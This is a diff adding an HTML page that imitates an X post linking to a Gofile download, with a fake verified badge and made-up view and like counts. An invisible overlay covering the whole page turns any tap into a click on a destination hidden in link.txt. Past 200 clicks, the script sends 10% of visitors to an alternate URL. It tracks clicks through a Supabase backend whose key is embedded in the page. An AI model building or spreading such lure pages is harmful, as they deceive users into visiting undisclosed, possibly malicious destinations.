@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<meta name="theme-color" content="#000000">
+<title>星乃リア · Gofile</title>
+<meta property="og:title" content="星乃リア · Gofile">
+<meta property="og:image" content="https://click-click.site/a/20260925_2346/thumb.jpg">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="星乃リア · Gofile">
+<meta name="twitter:image" content="https://click-click.site/a/20260925_2346/thumb.jpg">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+html,body{height:100%;background:#000;}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;color:#e7e9ea;-webkit-font-smoothing:antialiased;}
+.lc-go{cursor:pointer;text-decoration:none;color:inherit;}
+.lc-tapall{position:fixed;inset:0;z-index:9000;display:block;background:transparent;}
+/* Nav */
+.xc-nav{display:flex;align-items:center;gap:16px;padding:10px 16px;position:sticky;top:0;background:rgba(0,0,0,0.85);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);border-bottom:1px solid rgba(255,255,255,0.08);z-index:10;}
+.xc-nav-logo svg{width:24px;height:24px;fill:#e7e9ea;}
+.xc-nav-tabs{display:flex;flex:1;justify-content:center;gap:0;}
+.xc-nav-tab{flex:1;text-align:center;padding:14px 0 12px;font-size:15px;font-weight:500;color:#71767b;position:relative;}
+.xc-nav-tab.on{color:#e7e9ea;font-weight:700;}
+.xc-nav-tab.on::after{content:'';position:absolute;bottom:0;left:50%;translate:-50% 0;width:56px;height:4px;border-radius:9px;background:#1d9bf0;}
+/* Tweet */
+.xc-feed{max-width:600px;margin:0 auto;}
+.xc-tweet{padding:12px 16px;border-bottom:1px solid rgba(255,255,255,0.08);}
+.xc-tweet-head{display:flex;align-items:flex-start;gap:10px;margin-bottom:6px;}
+.xc-avatar{width:40px;height:40px;border-radius:50%;background:#333;flex:0 0 auto;overflow:hidden;}
+.xc-avatar img{width:100%;height:100%;object-fit:cover;display:block;}
+.xc-tweet-info{flex:1;min-width:0;}
+.xc-name-row{display:flex;align-items:center;gap:4px;flex-wrap:wrap;}
+.xc-name{font-size:15px;font-weight:700;color:#e7e9ea;}
+.xc-verified svg{width:18px;height:18px;}
+.xc-handle{font-size:14px;color:#71767b;}
+.xc-dot{color:#71767b;font-size:14px;}
+.xc-time{font-size:14px;color:#71767b;}
+.xc-tweet-more{width:34px;height:34px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#71767b;flex:0 0 auto;}
+.xc-tweet-more svg{width:18px;height:18px;}
+.xc-tweet-body{font-size:15px;line-height:1.55;color:#e7e9ea;margin-bottom:12px;word-break:break-word;}
+/* Large card */
+.xc-card-img{display:block;border-radius:16px;overflow:hidden;border:1px solid rgba(255,255,255,0.12);background:#000;aspect-ratio:16/9;margin-bottom:12px;}
+.xc-card-img img{width:100%;height:100%;object-fit:contain;display:block;}
+/* Small card */
+.xc-card-small{display:flex;align-items:stretch;border-radius:16px;overflow:hidden;border:1px solid rgba(255,255,255,0.12);margin-bottom:12px;background:#16181c;}
+.xc-card-small-img{width:100px;height:100px;flex:0 0 auto;background:#fff;display:flex;align-items:center;justify-content:center;}
+.xc-card-small-img img{width:72px;height:72px;object-fit:contain;display:block;}
+.xc-card-small-body{flex:1;min-width:0;padding:10px 12px;display:flex;flex-direction:column;justify-content:center;gap:4px;}
+.xc-card-small-title{font-size:14px;color:#e7e9ea;font-weight:500;overflow:hidden;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;}
+.xc-card-small-meta{display:flex;align-items:center;gap:4px;font-size:12px;color:#71767b;}
+/* Actions */
+.xc-actions{display:flex;align-items:center;justify-content:space-between;margin-top:4px;}
+.xc-act{display:flex;align-items:center;gap:4px;color:#71767b;font-size:13px;}
+.xc-act svg{width:18px;height:18px;}
+/* Views & date */
+.xc-stats{display:flex;align-items:center;gap:6px;padding:12px 0;border-top:1px solid rgba(255,255,255,0.08);border-bottom:1px solid rgba(255,255,255,0.08);margin:10px 0;font-size:14px;color:#71767b;}
+.xc-stats span{color:#e7e9ea;font-weight:700;}
+.xc-date-full{font-size:14px;color:#71767b;margin-top:6px;}
+</style>
+</head>
+<body>
+<nav class="xc-nav">
+  <div class="xc-nav-logo"><svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.739l7.732-8.836L2.012 2.25h6.945l4.265 5.638Zm-1.161 17.52h1.833L7.084 4.126H5.117Z"/></svg></div>
+  <div class="xc-nav-tabs">
+    <div class="xc-nav-tab">おすすめ</div>
+    <div class="xc-nav-tab on">フォロー中</div>
+  </div>
+</nav>
+<div class="xc-feed">
+  <div class="xc-tweet">
+    <div class="xc-tweet-head">
+      <a href="#" class="lc-go xc-avatar"><img src="https://click-click.site/a/20260925_2346/thumb.jpg" alt=""></a>
+      <div class="xc-tweet-info">
+        <div class="xc-name-row">
+          <span class="xc-name">星乃リア</span>
+          <span class="xc-verified"><svg viewBox="0 0 24 24" fill="#1d9bf0"><path d="M22.25 12c0-1.43-.88-2.67-2.19-3.34.46-1.39.2-2.9-.81-3.91s-2.52-1.27-3.91-.81c-.66-1.31-1.9-2.19-3.34-2.19s-2.67.88-3.33 2.19c-1.4-.46-2.91-.2-3.92.81s-1.26 2.52-.8 3.91c-1.31.67-2.2 1.91-2.2 3.34s.89 2.67 2.2 3.34c-.46 1.39-.21 2.9.8 3.91s2.52 1.26 3.91.81c.67 1.31 1.9 2.19 3.34 2.19s2.68-.88 3.34-2.19c1.39.45 2.9.2 3.91-.81s1.27-2.52.81-3.91c1.31-.67 2.19-1.91 2.19-3.34zm-11.71 4.2L6.8 12.46l1.41-1.42 2.26 2.26 4.8-5.23 1.47 1.36z"/></svg></span>
+          <span class="xc-handle">@星乃リア</span>
+          <span class="xc-dot">·</span>
+          <span class="xc-time">23:23</span>
+        </div>
+      </div>
+      <div class="xc-tweet-more"><svg viewBox="0 0 24 24" fill="currentColor"><circle cx="5" cy="12" r="1.5"/><circle cx="12" cy="12" r="1.5"/><circle cx="19" cy="12" r="1.5"/></svg></div>
+    </div>
+    <div class="xc-tweet-body">星乃リア · Gofile</div>
+    
+  <a href="#" class="lc-go xc-card-small">
+    <div class="xc-card-small-img"><img src="https://click-click.site/Gofile.png" alt=""></div>
+    <div class="xc-card-small-body">
+      <div class="xc-card-small-title">星乃リア · Gofile</div>
+      <div class="xc-card-small-meta">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="12" height="12"><circle cx="12" cy="12" r="10"/><path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"/><path d="M2 12h20"/></svg>
+        gofile.io
+      </div>
+    </div>
+  </a>
+    <div class="xc-actions">
+      <div class="xc-act"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>1.4K</div>
+      <div class="xc-act"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M17 1l4 4-4 4"/><path d="M3 11V9a4 4 0 0 1 4-4h14"/><path d="M7 23l-4-4 4-4"/><path d="M21 13v2a4 4 0 0 1-4 4H3"/></svg>2.6K</div>
+      <div class="xc-act"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg>27.7K</div>
+      <div class="xc-act"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/></svg></div>
+      <div class="xc-act"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg></div>
+    </div>
+    <div class="xc-stats">
+      <svg viewBox="0 0 24 24" fill="currentColor" width="18" height="18"><path d="M8.75 21V3h2v18h-2zM18 21V8.5h2V21h-2zM4 21l.004-10h2L6 21H4zm9.248 0v-7h2v7h-2z"/></svg>
+      <span>826.8K</span> Views
+    </div>
+    <div class="xc-date-full">23:23 · Sep 25, 2026 · <span style="color:#1d9bf0">X for iPhone</span></div>
+  </div>
+</div>
+<a href="#" class="lc-go lc-tapall" aria-label="星乃リア · Gofile"></a>
+<script>(function(){
+  var SB='https://qvttkbjxnvsbufaxqpkj.supabase.co';
+  var KEY='sb_publishable_Ab6lztc5Y2BHT7IRXXrzMg_soFsDudr';
+  var PATH='a/20260925_2346';
+  var HAS_ALT=true;
+  var PREVIEW=false;
+  var PREVIEW_URL="";
+  var PREVIEW_ALT="";
+  function rpc(fn){if(PREVIEW)return;fetch(SB+'/rest/v1/rpc/'+fn,{method:'POST',headers:{apikey:KEY,Authorization:'Bearer '+KEY,'Content-Type':'application/json'},body:JSON.stringify({p_path:PATH}),keepalive:true}).catch(function(){});}
+  function fetchCt(){return fetch(SB+'/rest/v1/stats?path=eq.'+encodeURIComponent(PATH)+'&select=ct',{headers:{apikey:KEY,Authorization:'Bearer '+KEY}}).then(function(r){return r.json();}).then(function(rows){return(rows[0]&&rows[0].ct)||0;}).catch(function(){return 0;});}
+  rpc('increment_pv');
+  var linkP=PREVIEW?Promise.resolve(PREVIEW_URL):fetch('./link.txt').then(function(r){return r.text();}).then(function(t){return t.trim();}).catch(function(){return'';});
+  var altP=PREVIEW?Promise.resolve(PREVIEW_ALT):(HAS_ALT?fetch('./link2.txt').then(function(r){return r.text();}).then(function(t){return t.trim();}).catch(function(){return'';}) :Promise.resolve(''));
+  Promise.all([linkP,altP,(!PREVIEW&&HAS_ALT)?fetchCt():Promise.resolve(0)]).then(function(vals){
+    var url=vals[0],altUrl=vals[1],ct=vals[2];
+    if(!url)return;
+    var target=(altUrl&&!PREVIEW&&ct>200&&Math.random()<0.1)?altUrl:url;
+    var gos=document.querySelectorAll('.lc-go');
+    for(var i=0;i<gos.length;i++)gos[i].href=target;
+  });
+  var sent=false;
+  function track(){if(sent)return;sent=true;rpc('increment_ct');}
+  var gos=document.querySelectorAll('.lc-go');
+  for(var j=0;j<gos.length;j++)gos[j].addEventListener('click',track,{capture:true});
+  document.addEventListener('touchstart',function(e){if(e.target.closest&&e.target.closest('.lc-go'))track();},{passive:true,capture:true});
+})();</script>
+</body>
+</html>
